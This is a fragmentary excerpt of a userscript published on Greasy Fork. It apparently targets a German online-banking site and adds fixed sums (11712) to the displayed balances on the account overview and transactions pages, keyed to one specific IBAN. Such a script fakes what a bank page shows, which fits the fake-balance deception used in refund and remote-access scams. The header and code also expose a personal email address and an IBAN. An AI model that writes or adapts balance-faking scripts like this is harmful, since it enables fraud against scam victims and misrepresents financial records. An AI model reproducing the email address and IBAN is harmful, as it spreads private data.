// ==UserScript==
// @name         Ed Start 4REc db.Sp.Wolfgang.schnke@t-online.de
...
// @downloadURL https://update.greasyfork.org/scripts/517162/Ed%20Start%204REc%20dbSpWolfgangschnke%40t-onlinede.user.js
// @updateURL https://update.greasyfork.org/scripts/517162/Ed%20Start%204REc%20dbSpWolfgangschnke%40t-onlinede.meta.js
// ==/UserScript==
//======================================================================================================================================================================================
//++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
//======================================================================================================================================================================================
...
//         UBERSICHT
    ...
    const accountBalanceAdjustments = [
        ...
        { index: 1, amount: 0 },
         ...
         { index: 2, amount: 11712},  //3   // will have to change to 1395
        { index: 3, amount: 0 },  // 4  //will have to change to app 5700
       { index: 4, amount: 11712 },  // 5
         { index: 5, amount: 11712 }, //1
         { index: 6, amount:  0},
        { index: 7, amount: 11712 }, //2
         { index: 8, amount:  0},
        { index: 9, amount: 0 },
...
//     UMSATZE BALANCE
    ...
    var adjustValue = 11712.00; // Modify this value as needed

    // Specify the IBAN value to check for
    var ibanCheck = "DE87 1207 0024 0463 2782 00";
